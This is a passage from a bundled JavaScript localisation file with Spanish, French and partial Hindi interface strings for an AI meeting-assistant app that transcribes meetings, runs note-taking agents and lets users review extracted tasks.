sincronizados\",\"synced_one\":\"{{count}} evento sincronizado\",\"synced_other\":\"{{count}} eventos sincronizados\",\"title\":\"Reuniones\"},\"manifest\":{\"configuration_1\":\"Permite que el navegador acceda al micrófono para la captura en directo; configura de forma opcional en Ajustes una ruta o URL de iCalendar, el registro local de tareas, los roles de agente y los términos de corrección de voz.\",\"description\":\"Un asistente de reuniones con IA. Transcribe una reunión en vivo, mantiene notas estructuradas y diagramas a medida que avanza, extrae tareas y te deja revisarlas antes de registrarlas.\",\"display_name\":\"Reuniones\",\"highlight_1\":\"Transcripción en vivo con el propio motor de voz a texto de Kiro Crew — sin un daemon extra y sin una cuenta en la nube más allá de la que ya usas\",\"highlight_2\":\"Un equipo de agentes trabaja la reunión en paralelo: notas estructuradas, un diagrama HTML/Mermaid y una lista de tareas\",\"highlight_3\":\"Corrige una vez los errores recurrentes de voz a texto con un diccionario de tu dominio y todas las reuniones siguientes los transcriben bien\",\"highlight_4\":\"Revisa las tareas extraídas antes de registrar nada — archiva el ruido y registra el resto\",\"highlight_5\":\"Proveedores de tareas y de calendario conectables: incluye un registro local de tareas y un lector de iCalendar (.ics), y una organización puede registrar los suyos\",\"highlight_6\":\"Lee la transcripción línea a línea en otro idioma mientras la reunión sigue en curso\",\"highlight_7\":\"Guarda tus propias notas junto a las de los agentes — pega una captura de pantalla y queda con el tiempo transcurrido de la reunión\",\"page_label\":\"Reuniones\",\"use_case_1\":\"Captura una reunión en directo mientras agentes paralelos crean la transcripción, las notas estructuradas, el diagrama y la revisión de tareas.\"},\"meeting\":{\"agentsPaused\":\"Los agentes se detuvieron tras varios fallos.\",\"attachPrompt\":\"Pega un enlace para compartir con los agentes\",\"back\":\"Volver\",\"endAndReview\":\"Terminar y revisar\",\"ended\":\"Terminada\",\"endingReview\":\"Finalizando — preparando la revisión…\",\"live\":\"En directo\",\"loadFailed\":\"No se pudo abrir esta reunión\",\"moreActions\":\"Más acciones\",\"noAgents\":\"Ningún agente activo\",\"noAgentsHint\":\"Activa uno en la barra de arriba, o elige un preajuste.\",\"pause\":\"Pausar\",\"paused\":\"En pausa\",\"pausing\":\"Pausando…\",\"refresh\":\"Actualizar\",\"restart\":\"Reiniciar\",\"resuming\":\"Reanudando…\",\"retryAgents\":\"Reintentar\",\"start\":\"Empezar\",\"titleLabel\":\"Título de la reunión\",\"toggleNote\":\"Mi nota\",\"toggleTasks\":\"Tareas\",\"toggleTranslation\":\"Traducción\",\"unpause\":\"Reanudar\"},\"note\":{\"close\":\"Cerrar la nota\",\"edit\":\"Editar\",\"editorLabel\":\"Texto de la nota\",\"hint\":\"Se guarda automáticamente mientras escribes.\",\"loadFailed\":\"No se pudo leer tu nota del disco. La edición está en pausa para no sobrescribir nada: cierra y vuelve a abrir el panel para reintentarlo.\",\"loading\":\"Cargando tu nota…\",\"paused\":\"Edición en pausa\",\"placeholder\":\"Escribe aquí tus propias notas. Se admite Markdown.\",\"preview\":\"Vista previa\",\"saved\":\"Guardada\",\"saving\":\"Guardando…\",\"title\":\"Mi nota\",\"unsaved\":\"Cambios sin guardar\",\"uploading\":\"Añadiendo la imagen…\"},\"pillBar\":{\"addLink\":\"Añadir un enlace\",\"agentMuted\":\"{{name}} no está escuchando\",\"attachmentsMenu\":\"Adjuntos\",\"createPreset\":\"Crear un preajuste\",\"disableAgent\":\"Desactivar a {{name}}\",\"enableAgent\":\"Activar a {{name}}\",\"listening\":\"Escuchando\",\"manageAgents\":\"Gestionar los agentes\",\"manageAttachments\":\"Gestionar los adjuntos\",\"noAttachments\":\"Sin adjuntos\",\"noPreset\":\"Sin preajuste\",\"presetDefaultOption\":\"{{name}} (predeterminado)\",\"presetLabel\":\"Preajuste de agentes\",\"removeAttachment\":\"Quitar {{label}}\",\"usingDefaultPreset\":\"Se usa el preajuste predeterminado\"},\"priority\":{\"high\":\"Alta\",\"low\":\"Baja\",\"medium\":\"Media\"},\"review\":{\"allDone\":\"Todo revisado\",\"archive\":\"Archivar\",\"archiveAll\":\"Archivar el resto\",\"archiveOthers_many\":\"Archivar las otras {{count}}\",\"archiveOthers_one\":\"Archivar la otra {{count}}\",\"archiveOthers_other\":\"Archivar las otras {{count}}\",\"archiveSkipsFiling\":\"Se omiten los elementos que se están registrando\",\"archivedSection\":\"Archivadas\",\"assignedTo\":\"Asignada a {{name}}\",\"backToMeeting\":\"Volver a la reunión\",\"closeBlocked_many\":\"{{count}} siguen sin decidir\",\"closeBlocked_one\":\"{{count}} sigue sin decidir\",\"closeBlocked_other\":\"{{count}} siguen sin decidir\",\"closeMeeting\":\"Cerrar la reunión\",\"file\":\"Registrar\",\"filedSection\":\"Registradas en {{provider}}\",\"filing\":\"Registrando…\",\"nothingPending\":\"No queda nada por revisar\",\"nothingPendingHint\":\"Todas las tareas se han registrado o archivado.\",\"pendingSection\":\"Pendientes\",\"remaining_many\":\"quedan {{count}} por revisar\",\"remaining_one\":\"queda {{count}} por revisar\",\"remaining_other\":\"quedan {{count}} por revisar\",\"statArchived\":\"Archivadas\",\"statFiled\":\"Registradas\",\"statPending\":\"Pendientes\",\"title\":\"Revisión de tareas\",\"unarchive\":\"Restaurar\"},\"session\":{\"agentToggleFailed\":\"No se pudo cambiar ese agente.\",\"agentsResumed\":\"Los agentes vuelven a funcionar.\",\"anotherMeetingActive\":\"Ya hay otra reunión en marcha. Termínala primero.\",\"anotherMeetingActiveNamed\":\"«{{title}}» sigue en marcha. Ábrela en Reuniones y elige primero «Terminar y revisar».\",\"anotherMeetingReviewing\":\"«{{title}}» sigue en revisión. Ábrela en Reuniones y elige primero «Cerrar la reunión».\",\"attachmentFailed\":\"No se pudieron actualizar los adjuntos.\",\"broadcastFailed\":\"No se pudo contactar con los agentes.\",\"broadcastSent\":\"Enviado a los agentes que escuchan.\",\"ended\":\"Reunión terminada.\",\"messageFailed\":\"No se pudo enviar ese mensaje.\",\"minutesRevertFailed\":\"No se pudieron descartar tus cambios.\",\"minutesSaveFailed\":\"No se pudieron guardar tus cambios.\",\"noteImageFailed\":\"No se pudo añadir esa imagen. Pega un PNG, JPEG, GIF o WebP.\",\"noteImageTooLarge\":\"Esa imagen es demasiado grande para una nota.\",\"noteSaveFailed\":\"No se pudo guardar tu nota.\",\"openVoiceSettings\":\"Abrir ajustes de voz\",\"renameFailed\":\"No se pudo cambiar el nombre de la reunión.\",\"startFailed\":\"No se pudo iniciar la reunión.\",\"started\":\"Reunión iniciada.\",\"statusFailed\":\"No se pudo cambiar el estado de la reunión.\",\"stopFailed\":\"No se pudo terminar la reunión.\",\"sttConnectionFailed\":\"No se pudo conectar con la transcripción.\",\"sttDisconnected\":\"La transcripción se desconectó.\",\"sttDispatchFailed\":\"No se pudo entregar un segmento de la transcripción a los agentes.\",\"sttMicDenied\":\"Se denegó el acceso al micrófono.\",\"sttStreamingDisabled\":\"La transcripción en vivo está desactivada. En Ajustes → Voz, comprueba que la entrada de voz esté activada, que el proveedor admita streaming y que Streaming esté activado.\",\"sttUnavailable\":\"La transcripción no está disponible.\",\"sttUnsupported\":\"Este navegador no puede grabar audio.\",\"sttWorkletFailed\":\"No se pudo iniciar el procesador de audio.\",\"taskAddFailed\":\"No se pudo añadir esa tarea.\",\"taskFileFailed\":\"No se pudo registrar esa tarea.\",\"taskFiled\":\"Tarea registrada.\",\"untitled\":\"Reunión sin título\"},\"settings\":{\"addTerm\":\"Añadir\",\"agentsHelp\":\"Qué agentes ofrece una reunión, y cuáles de ellos empiezan activados.\",\"agentsTitle\":\"Agentes\",\"aliasesLabel\":\"Formas mal oídas\",\"aliasesPlaceholder\":\"Lo que oye la transcripción, separado por comas…\",\"back\":\"Volver\",\"calendarHelp\":\"De dónde se leen las próximas reuniones.\",\"calendarProviderLabel\":\"Proveedor de calendario\",\"calendarSourceHint\":\"Una ruta a un archivo .ics local, o una URL https que apunte a uno.\",\"calendarSourceLabel\":\"Origen del calendario\",\"calendarSourcePlaceholder\":\"Ruta o URL de un archivo .ics…\",\"calendarTitle\":\"Calendario\",\"correctLabel\":\"Término correcto\",\"correctPlaceholder\":\"Lo que debería decir…\",\"dictionaryHelp\":\"Corrige una vez un error recurrente de transcripción y todas las reuniones posteriores lo dirán bien.\",\"dictionaryTitle\":\"Diccionario de voz\",\"enabledByDefault\":\"Activar a {{name}} de forma predeterminada\",\"noTerms\":\"Aún no hay correcciones\",\"noTermsHint\":\"Escribe a la izquierda lo que la transcripción oye mal, y a la derecha lo que debería decir.\",\"removeTerm\":\"Quitar {{term}}\",\"saveFailed\":\"No se pudieron guardar los ajustes.\",\"saveSource\":\"Guardar\",\"saved\":\"Guardado.\",\"subtitle\":\"Proveedores, agentes y el diccionario de voz\",\"taskProviderHelp\":\"Dónde se registran las tareas revisadas.\",\"taskProviderTitle\":\"Proveedor de tareas\",\"termFailed\":\"No se pudo añadir esa corrección.\",\"termIncomplete\":\"Escribe lo que se oyó y lo que debería decir.\",\"title\":\"Ajustes de Reuniones\",\"translationHelp\":\"Traduce cada línea hablada a otro idioma y la muestra en un panel lateral durante la reunión. Consume una llamada al modelo por línea, así que está desactivada de forma predeterminada.\",\"translationOff\":\"Desactivada\",\"translationTitle\":\"Traducción en vivo\"},\"taskSidebar\":{\"add\":\"Añadir\",\"assigneeLabel\":\"Responsable\",\"close\":\"Cerrar las tareas\",\"deleteTask\":\"Eliminar esta tarea\",\"descriptionLabel\":\"Tarea\",\"empty\":\"Aún no se ha extraído nada.\",\"filed\":\"Registrada\",\"heading_many\":\"{{count}} tareas\",\"heading_one\":\"{{count}} tarea\",\"heading_other\":\"{{count}} tareas\",\"priorityLabel\":\"Prioridad\",\"quickAddPlaceholder\":\"Añadir una tarea…\",\"title\":\"Tareas\",\"unassigned\":\"Sin asignar\"},\"transcript\":{\"empty\":\"Aún no hay transcripción\",\"emptyHintLive\":\"La voz final aparecerá aquí a medida que avance la reunión.\",\"emptyHintPaused\":\"En pausa — el habla aparecerá aquí al reanudar.\",\"emptyHintRecorded\":\"No se grabó ninguna transcripción para esta reunión.\",\"full\":\"La transcripción está llena. El audio y los mensajes nuevos ya no se grabarán ni se enviarán a los agentes.\",\"jumpToLatest\":\"Ir a lo más reciente\",\"live\":\"En vivo\",\"regionLabel\":\"Transcripción de la reunión\",\"title\":\"Transcripción\",\"typed\":\"Escrito\"},\"translation\":{\"close\":\"Cerrar la traducción\",\"dropped\":\"Se omitieron algunas líneas para no quedarse atrás.\",\"empty\":\"Aún no hay nada traducido\",\"emptyHint\":\"Las líneas aparecen aquí a medida que se habla.\",\"lineFailed\":\"No se pudo traducir esta línea.\",\"loading\":\"Cargando…\",\"pending\":\"Poniéndose al día…\",\"title\":\"Traducción\"},\"widgetType\":{\"chat\":\"Chat\",\"html\":\"Diagrama\",\"markdown\":\"Notas\"}}}"),
		components: { "confirmDialog": { "cancel": "Cancelar" } }
	},
	fr: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"Le résultat de {{name}} apparaîtra ici.\",\"cancel\":\"Annuler\",\"chatEmpty\":\"Rien n’a encore été envoyé à {{name}}.\",\"collapse\":\"Rétablir {{name}} dans la disposition partagée\",\"diagramFrameTitle\":\"Schéma de {{name}}\",\"discardDraft\":\"Abandonner les modifications non enregistrées\",\"discardDraftHint\":\"Les modifications non enregistrées seront définitivement supprimées.\",\"edit\":\"Modifier cette sortie\",\"edited\":\"Modifié\",\"editorLabel\":\"Sortie de {{name}}, modifiable\",\"expand\":\"Agrandir {{name}}\",\"listeningHint\":\"Écoute la réunion\",\"messagePlaceholder\":\"Message à {{name}}…\",\"mute\":\"Couper {{name}}\",\"mutedHint\":\"N’écoute pas la réunion\",\"revert\":\"Abandonner mes modifications\",\"revertHint\":\"Supprimer définitivement mes modifications et afficher ce que {{name}} a écrit\",\"save\":\"Enregistrer\",\"saving\":\"Enregistrement…\",\"send\":\"Envoyer\",\"showChat\":\"Afficher la discussion\",\"showOutput\":\"Afficher le résultat\",\"staleEdit\":\"{{name}} a continué à écrire depuis ta modification. C'est ta version qui est affichée ; abandonne tes modifications pour voir la sienne.\",\"unmute\":\"Réactiver {{name}}\"},\"broadcastBar\":{\"heard\":\"Entendu : {{text}}\",\"pausedPlaceholder\":\"Agents en pause — reprenez pour envoyer\",\"pausingPlaceholder\":\"Mise en pause — envoi indisponible\",\"placeholder\":\"Dites quelque chose à tous les agents à l’écoute…\",\"resumingPlaceholder\":\"Reprise — l'envoi sera bientôt disponible\",\"send\":\"Envoyer\"},\"list\":{\"adHocTitle\":\"Réunion improvisée\",\"deleteConfirm\":\"Supprimer « {{title}} » ainsi que toutes ses notes, ses schémas et ses actions\xA0? Cette opération est irréversible.\",\"deleteFailed\":\"Impossible de supprimer cette réunion.\",\"deleteMeeting\":\"Supprimer {{title}}\",\"deleteUnavailable\":\"Terminez cette réunion avant de la supprimer\",\"deleted\":\"«\xA0{{title}}\xA0» a été supprimée\",\"empty\":\"Aucune réunion\",\"emptyHintNoCalendar\":\"Connectez un agenda dans les réglages, ou lancez une réunion improvisée.\",\"emptyHintSynced\":\"Rien dans l’agenda, et aucune réunion travaillée pour l’instant.\",\"filterPlaceholder\":\"Filtrer les réunions…\",\"hasNotes\":\"Contient des notes\",\"liveBanner\":\"{{title}} est en cours\",\"newMeeting\":\"Nouvelle réunion\",\"returnToMeeting\":\"Revenir à la réunion\",\"reviewing\":\"En revue\",\"reviewingBanner\":\"{{title}} attend la revue des actions\",\"sectionTitle\":\"Toutes les réunions\",\"settings\":\"Réglages\",\"statLive\":\"En cours\",\"statScheduled\":\"Planifiées\",\"statWorked\":\"Travaillées\",\"subtitle\":\"Notes, schémas et actions en direct pendant la réunion\",\"syncCalendar\":\"Synchroniser l’agenda\",\"syncFailed\":\"Impossible de synchroniser l’agenda.\",\"synced_many\":\"{{count}} événements synchronisés\",\"synced_one\":\"{{count}} événement synchronisé\",\"synced_other\":\"{{count}} événements synchronisés\",\"title\":\"Réunions\"},\"manifest\":{\"configuration_1\":\"Autorise le navigateur à accéder au microphone pour la capture en direct ; configure éventuellement dans les paramètres un chemin ou une URL iCalendar, le registre local des tâches, les rôles d'agent et les termes de correction vocale.\",\"description\":\"Un assistant de réunion doté d’IA. Transcrit une réunion en direct, tient des notes et des schémas structurés au fil de l’eau, extrait les actions à suivre et te les fait relire avant enregistrement.\",\"display_name\":\"Réunions\",\"highlight_1\":\"Transcription en direct via la reconnaissance vocale intégrée de Kiro Crew — aucun démon supplémentaire, aucun compte cloud au-delà de ceux que tu utilises déjà\",\"highlight_2\":\"Une équipe d’agents traite la réunion en parallèle : notes structurées, schéma HTML/Mermaid et liste d’actions à suivre\",\"highlight_3\":\"Corrige une seule fois les erreurs récurrentes de reconnaissance vocale grâce à un dictionnaire métier, et toutes les réunions suivantes les écrivent correctement\",\"highlight_4\":\"Relis les actions extraites avant tout enregistrement — archive le bruit, enregistre le reste\",\"highlight_5\":\"Fournisseurs de tâches et d’agenda enfichables : un registre de tâches local et un lecteur iCalendar (.ics) sont fournis, et une organisation peut enregistrer les siens\",\"highlight_6\":\"Relis la transcription ligne par ligne dans une autre langue pendant que la réunion se déroule\",\"highlight_7\":\"Garde tes propres notes à côté de celles des agents — colle une capture d'écran et elle arrive avec le temps écoulé de la réunion\",\"page_label\":\"Réunions\",\"use_case_1\":\"Capture une réunion en direct pendant que des agents parallèles produisent la transcription, les notes structurées, le diagramme et la revue des actions à mener.\"},\"meeting\":{\"agentsPaused\":\"Les agents se sont arrêtés après plusieurs échecs.\",\"attachPrompt\":\"Collez un lien à partager avec les agents\",\"back\":\"Retour\",\"endAndReview\":\"Terminer et passer en revue\",\"ended\":\"Terminée\",\"endingReview\":\"Fin en cours — préparation de la revue…\",\"live\":\"En cours\",\"loadFailed\":\"Impossible d’ouvrir cette réunion\",\"moreActions\":\"Plus d'actions\",\"noAgents\":\"Aucun agent activé\",\"noAgentsHint\":\"Activez-en un dans la barre ci-dessus, ou choisissez un préréglage.\",\"pause\":\"Mettre en pause\",\"paused\":\"En pause\",\"pausing\":\"Mise en pause…\",\"refresh\":\"Actualiser\",\"restart\":\"Relancer\",\"resuming\":\"Reprise…\",\"retryAgents\":\"Réessayer\",\"start\":\"Démarrer\",\"titleLabel\":\"Titre de la réunion\",\"toggleNote\":\"Ma note\",\"toggleTasks\":\"Actions à suivre\",\"toggleTranslation\":\"Traduction\",\"unpause\":\"Reprendre\"},\"note\":{\"close\":\"Fermer la note\",\"edit\":\"Modifier\",\"editorLabel\":\"Texte de la note\",\"hint\":\"Enregistrement automatique au fil de la saisie.\",\"loadFailed\":\"Impossible de lire ta note sur le disque. La modification est en pause pour ne rien écraser : ferme puis rouvre le panneau pour réessayer.\",\"loading\":\"Chargement de ta note…\",\"paused\":\"Modification en pause\",\"placeholder\":\"Écris ici tes propres notes. Markdown est pris en charge.\",\"preview\":\"Aperçu\",\"saved\":\"Enregistrée\",\"saving\":\"Enregistrement…\",\"title\":\"Ma note\",\"unsaved\":\"Modifications non enregistrées\",\"uploading\":\"Ajout de l'image…\"},\"pillBar\":{\"addLink\":\"Ajouter un lien\",\"agentMuted\":\"{{name}} n’écoute pas\",\"attachmentsMenu\":\"Pièces jointes\",\"createPreset\":\"Créer un préréglage\",\"disableAgent\":\"Désactiver {{name}}\",\"enableAgent\":\"Activer {{name}}\",\"listening\":\"À l’écoute\",\"manageAgents\":\"Gérer les agents\",\"manageAttachments\":\"Gérer les pièces jointes\",\"noAttachments\":\"Aucune pièce jointe\",\"noPreset\":\"Aucun préréglage\",\"presetDefaultOption\":\"{{name}} (par défaut)\",\"presetLabel\":\"Préréglage d’agents\",\"removeAttachment\":\"Retirer {{label}}\",\"usingDefaultPreset\":\"Préréglage par défaut utilisé\"},\"priority\":{\"high\":\"Haute\",\"low\":\"Basse\",\"medium\":\"Moyenne\"},\"review\":{\"allDone\":\"Tout est passé en revue\",\"archive\":\"Archiver\",\"archiveAll\":\"Archiver le reste\",\"archiveOthers_many\":\"Archiver les {{count}} autres\",\"archiveOthers_one\":\"Archiver les {{count}} autres\",\"archiveOthers_other\":\"Archiver les {{count}} autres\",\"archiveSkipsFiling\":\"Les éléments en cours d’enregistrement sont ignorés\",\"archivedSection\":\"Archivées\",\"assignedTo\":\"Attribuée à {{name}}\",\"backToMeeting\":\"Revenir à la réunion\",\"closeBlocked_many\":\"{{count}} attendent encore une décision\",\"closeBlocked_one\":\"{{count}} attend encore une décision\",\"closeBlocked_other\":\"{{count}} attendent encore une décision\",\"closeMeeting\":\"Clore la réunion\",\"file\":\"Enregistrer\",\"filedSection\":\"Enregistrées dans {{provider}}\",\"filing\":\"Enregistrement…\",\"nothingPending\":\"Plus rien à passer en revue\",\"nothingPendingHint\":\"Chaque action a été enregistrée ou archivée.\",\"pendingSection\":\"En attente\",\"remaining_many\":\"encore {{count}} à passer en revue\",\"remaining_one\":\"encore {{count}} à passer en revue\",\"remaining_other\":\"encore {{count}} à passer en revue\",\"statArchived\":\"Archivées\",\"statFiled\":\"Enregistrées\",\"statPending\":\"En attente\",\"title\":\"Revue des actions\",\"unarchive\":\"Restaurer\"},\"session\":{\"agentToggleFailed\":\"Impossible de modifier cet agent.\",\"agentsResumed\":\"Les agents fonctionnent de nouveau.\",\"anotherMeetingActive\":\"Une autre réunion est déjà en cours. Terminez-la d’abord.\",\"anotherMeetingActiveNamed\":\"« {{title}} » est toujours en cours. Ouvre-la dans Réunions et choisis d’abord « Terminer et passer en revue ».\",\"anotherMeetingReviewing\":\"« {{title}} » est encore en revue. Ouvre-la dans Réunions et choisis d’abord « Clore la réunion ».\",\"attachmentFailed\":\"Impossible de mettre à jour les pièces jointes.\",\"broadcastFailed\":\"Impossible de joindre les agents.\",\"broadcastSent\":\"Envoyé aux agents à l’écoute.\",\"ended\":\"Réunion terminée.\",\"messageFailed\":\"Impossible d’envoyer ce message.\",\"minutesRevertFailed\":\"Impossible d'abandonner tes modifications.\",\"minutesSaveFailed\":\"Impossible d'enregistrer tes modifications.\",\"noteImageFailed\":\"Impossible d'ajouter cette image. Colle un PNG, JPEG, GIF ou WebP.\",\"noteImageTooLarge\":\"Cette image est trop volumineuse pour une note.\",\"noteSaveFailed\":\"Impossible d'enregistrer ta note.\",\"openVoiceSettings\":\"Ouvrir les paramètres vocaux\",\"renameFailed\":\"Impossible de renommer la réunion.\",\"startFailed\":\"Impossible de démarrer la réunion.\",\"started\":\"Réunion démarrée.\",\"statusFailed\":\"Impossible de changer l’état de la réunion.\",\"stopFailed\":\"Impossible de terminer la réunion.\",\"sttConnectionFailed\":\"Impossible de se connecter à la transcription.\",\"sttDisconnected\":\"La transcription s’est déconnectée.\",\"sttDispatchFailed\":\"Un segment de transcription n'a pas pu être transmis aux agents.\",\"sttMicDenied\":\"L’accès au microphone a été refusé.\",\"sttStreamingDisabled\":\"La transcription en direct est désactivée. Dans Paramètres → Voix, vérifie que la saisie vocale est activée, que le fournisseur gère le streaming et que Streaming est activé.\",\"sttUnavailable\":\"La transcription n’est pas disponible.\",\"sttUnsupported\":\"Ce navigateur ne peut pas enregistrer de son.\",\"sttWorkletFailed\":\"Impossible de démarrer le traitement audio.\",\"taskAddFailed\":\"Impossible d’ajouter cette action.\",\"taskFileFailed\":\"Impossible d’enregistrer cette action.\",\"taskFiled\":\"Action enregistrée.\",\"untitled\":\"Réunion sans titre\"},\"settings\":{\"addTerm\":\"Ajouter\",\"agentsHelp\":\"Quels agents une réunion propose, et lesquels démarrent activés.\",\"agentsTitle\":\"Agents\",\"aliasesLabel\":\"Formes mal entendues\",\"aliasesPlaceholder\":\"Ce que la transcription entend, séparé par des virgules…\",\"back\":\"Retour\",\"calendarHelp\":\"D’où sont lues les réunions à venir.\",\"calendarProviderLabel\":\"Fournisseur d’agenda\",\"calendarSourceHint\":\"Un chemin vers un fichier .ics local, ou une URL https vers un tel fichier.\",\"calendarSourceLabel\":\"Source de l’agenda\",\"calendarSourcePlaceholder\":\"Chemin ou URL d’un fichier .ics…\",\"calendarTitle\":\"Agenda\",\"correctLabel\":\"Terme correct\",\"correctPlaceholder\":\"Ce qu’il faudrait lire…\",\"dictionaryHelp\":\"Corrigez une fois une erreur de transcription récurrente et toutes les réunions suivantes l’écriront correctement.\",\"dictionaryTitle\":\"Dictionnaire vocal\",\"enabledByDefault\":\"Activer {{name}} par défaut\",\"noTerms\":\"Aucune correction pour l’instant\",\"noTermsHint\":\"Indiquez à gauche ce que la transcription entend mal, et à droite ce qu’il faudrait lire.\",\"removeTerm\":\"Retirer {{term}}\",\"saveFailed\":\"Impossible d’enregistrer les réglages.\",\"saveSource\":\"Enregistrer\",\"saved\":\"Enregistré.\",\"subtitle\":\"Fournisseurs, agents et dictionnaire vocal\",\"taskProviderHelp\":\"Où sont enregistrées les actions passées en revue.\",\"taskProviderTitle\":\"Fournisseur de tâches\",\"termFailed\":\"Impossible d’ajouter cette correction.\",\"termIncomplete\":\"Saisissez ce qui a été entendu et ce qu’il faudrait lire.\",\"title\":\"Réglages des réunions\",\"translationHelp\":\"Traduit chaque ligne prononcée dans une autre langue, affichée dans un panneau latéral pendant la réunion. Consomme un appel au modèle par ligne, elle est donc désactivée par défaut.\",\"translationOff\":\"Désactivée\",\"translationTitle\":\"Traduction en direct\"},\"taskSidebar\":{\"add\":\"Ajouter\",\"assigneeLabel\":\"Responsable\",\"close\":\"Fermer les actions\",\"deleteTask\":\"Supprimer cette action\",\"descriptionLabel\":\"Action à suivre\",\"empty\":\"Rien n’a encore été extrait.\",\"filed\":\"Enregistrée\",\"heading_many\":\"{{count}} actions à suivre\",\"heading_one\":\"{{count}} action à suivre\",\"heading_other\":\"{{count}} actions à suivre\",\"priorityLabel\":\"Priorité\",\"quickAddPlaceholder\":\"Ajouter une action…\",\"title\":\"Actions à suivre\",\"unassigned\":\"Non attribuée\"},\"transcript\":{\"empty\":\"Aucune transcription pour le moment\",\"emptyHintLive\":\"Les paroles finalisées apparaîtront ici au fil de la réunion.\",\"emptyHintPaused\":\"En pause — la parole apparaîtra ici après la reprise.\",\"emptyHintRecorded\":\"Aucune transcription n’a été enregistrée pour cette réunion.\",\"full\":\"La transcription est pleine. Les nouvelles paroles et diffusions ne seront plus enregistrées ni envoyées aux agents.\",\"jumpToLatest\":\"Aller au plus récent\",\"live\":\"En direct\",\"regionLabel\":\"Transcription de la réunion\",\"title\":\"Transcription\",\"typed\":\"Saisi\"},\"translation\":{\"close\":\"Fermer la traduction\",\"dropped\":\"Certaines lignes ont été ignorées pour suivre le rythme.\",\"empty\":\"Rien de traduit pour l'instant\",\"emptyHint\":\"Les lignes apparaissent ici au fil de la conversation.\",\"lineFailed\":\"Impossible de traduire cette ligne.\",\"loading\":\"Chargement…\",\"pending\":\"Rattrapage en cours…\",\"title\":\"Traduction\"},\"widgetType\":{\"chat\":\"Discussion\",\"html\":\"Schéma\",\"markdown\":\"Notes\"}}}"),
		components: { "confirmDialog": { "cancel": "Annuler" } }
	},
	hi: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}} का आउटपुट यहाँ दिखेगा।\",\"cancel\":\"रद्द करें\",\"chatEmpty\":\"{{name}} को अभी कुछ नहीं भेजा गया।\",\"collapse\":\"{{name}} को साथ-साथ वाले लेआउट में वापस लाओ\",\"diagramFrameTitle\":\"{{name}} का आरेख\",\"discardDraft\":\"बिना सहेजे बदलाव छोड़ें\",\"discardDraftHint\":\"बिना सहेजे बदलाव स्थायी रूप से हटा दिए जाएँगे।\",\"edit\":\"यह आउटपुट संपादित करें\",\"edited\":\"संपादित\",\"editorLabel\":\"{{name}} का आउटपुट, संपादन योग्य\",\"expand\":\"{{name}} बड़ा करो\",\"listeningHint\":\"मीटिंग सुन रहा है\",\"messagePlaceholder\":\"{{name}} को संदेश…\",\"mute\":\"{{name}} को म्यूट करें\",\"mutedHint\":\"मीटिंग नहीं सुन रहा है\",\"revert\":\"मेरे बदलाव छोड़ दें\",\"revertHint\":\"मेरे बदलाव स्थायी रूप से हटाकर वह दिखाएँ जो {{name}} ने लिखा\",\"save\":\"सहेजें\",\"saving\":\"सहेजा जा रहा है…\",\"send\":\"भेजें\",\"showChat\":\"चैट दिखाएँ\",\"showOutput\":\"आउटपुट दिखाएँ\",\"staleEdit\":\"इसे संपादित करने के बाद {{name}} ने और लिखा है। तुम्हारा संस्करण दिख रहा है; उसका देखने के लिए अपने बदलाव छोड़ दें।\",\"unmute\":\"{{name}} को अनम्यूट करें\"},\"broadcastBar\":{\"heard\":\"सुना गया: {{text}}\",\"pausedPlaceholder\":\"एजेंट रुके हैं — भेजने के लिए फिर से शुरू करें\",\"pausingPlaceholder\":\"रोका जा रहा है — भेजना उपलब्ध नहीं\",\"placeholder\":\"सुन रहे सभी एजेंटों से कुछ कहें…\",\"resumingPlaceholder\":\"फिर से शुरू हो रहा है — जल्द ही भेज सकेंगे\",\"send\":\"भेजें\"},\"list\":{\"adHocTitle\":\"तत्काल मीटिंग\",\"deleteConfirm\":\"“{{title}}” और उसके सभी नोट्स, आरेख व कार्य-बिंदु मिटाएँ? इसे वापस नहीं किया जा सकता।\",\"deleteFailed\":\"इस मीटिंग को मिटाया नहीं जा सका।\",\"deleteMeeting\":\"{{title}} मिटाएँ\",\"deleteUnavailable\":\"मिटाने से पहले इस मीटिंग को समाप्त करें\",\"deleted\":\"“{{title}}” मिटा दी गई\",\"empty\":\"कोई मीटिंग नहीं\",\"emptyHintNoCalendar\":\"सेटिंग्स में कैलेंडर जोड़ें, या एक तत्काल मीटिंग शुरू करें।\",\"emptyHintSynced\":\"कैलेंडर में कुछ नहीं है, और अभी तक किसी मीटिंग पर काम नहीं हुआ।\",\"filterPlaceholder\":\"मीटिंग छाँटें…\",\"hasNotes\":\"नोट्स मौजूद हैं\",\"liveBanner\":\"{{title}} चल रही है\",\"newMeeting\":\"नई मीटिंग\",\"returnToMeeting\":\"मीटिंग पर लौटें\",\"reviewing\":\"समीक्षा में\",\"reviewingBanner\":\"{{title}} कार्य-बिंदुओं की समीक्षा की प्रतीक्षा में है\",\"sectionTitle\":\"सभी मीटिंग\",\"settings\":\"सेटिंग्स\",\"statLive\":\"चल रही\",\"statScheduled\":\"निर्धारित\",\"statWorked\":\"काम हुआ\",\"subtitle\":\"मीटिंग के दौरान ही नोट्स, आरेख और कार्य-बिंदु\",\"syncCalendar\":\"कैलेंडर सिंक करें\",\"syncFailed\":\"कैलेंडर सिंक नहीं हो सका।\",\"synced_one\":\"{{count}} कार्यक्रम सिंक हुआ\",\"synced_other\":\"{{count}} कार्यक्रम सिंक हुए\",\"title\":\"मीटिंग\"},\"manifest\":{\"configuration_1\":\"लाइव कैप्चर के लिए ब्राउज़र को माइक्रोफ़ोन की अनुमति दें; चाहें तो Settings में iCalendar पथ या URL, लोकल task ledger, एजेंट भूमिकाएँ और speech-correction शब्द सेट करें।\",\"description\":\"एक AI मीटिंग सहायक। लाइव मीटिंग का ट्रांसक्रिप्ट बनाता है, साथ-साथ व्यवस्थित नोट्स और डायग्राम रखता है, ऐक्शन आइटम निकालता है, और फ़ाइल करने से पहले तुम्हें उनकी समीक्षा करने देता है।\",\"display_name\":\"मीटिंग्स\",\"highlight_1\":\"Kiro Crew के अपने स्पीच-टू-टेक्स्ट से लाइव ट्रांसक्रिप्शन — कोई अलग डीमन नहीं, जो पहले से इस्तेमाल में है उसके अलावा कोई क्लाउड खाता नहीं\",\"highlight_2\":\"एजेंट का एक दल मीटिंग पर समांतर काम करता है: व्यवस्थित नोट्स, एक HTML/Mermaid डायग्राम, और ऐक्शन आइटम की सूची\",\"highlight_3\":\"बार-बार होने वाली स्पीच-टू-टेक्स्ट गलतियाँ डोमेन डिक्शनरी से एक बार ठीक करो और आगे की हर मीटिंग 